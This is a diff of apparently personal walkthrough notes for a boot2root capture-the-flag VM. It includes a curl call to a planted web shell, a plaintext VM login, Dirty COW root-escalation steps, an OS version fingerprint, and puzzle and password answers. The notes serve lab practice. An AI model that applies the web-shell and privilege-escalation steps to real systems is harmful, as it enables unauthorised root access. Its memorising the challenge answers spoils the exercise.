@@ -62,6 +62,13 @@ curl --insecure  -X POST https://localhost:8443/forum/templates_c/cmd3.php -d "_
 vm login: lmezard
 pass: G!@M6f4Eatau{sF"
 
+NAME="Ubuntu"
+VERSION="12.04.5 LTS, Precise Pangolin"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu precise (12.04.5 LTS)"
+VERSION_ID="12.04"
+
 
 method 1:
 dirty cow
@@ -73,6 +80,8 @@ change the firefart string to the name of the new root user
 gcc -pthread dirty.c -o dirty -lcrypt
 
 you are now root
+
+method 2:
 
 bomb:
 HINT:
@@ -109,6 +118,12 @@ thor
 New:
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
 
+
+
+zaz 
+echo -n "SLASH" | md5sum
+
+646da671ca01bb5d84dbb5fb2238dc8e
 
 
 in zaz exploit_me
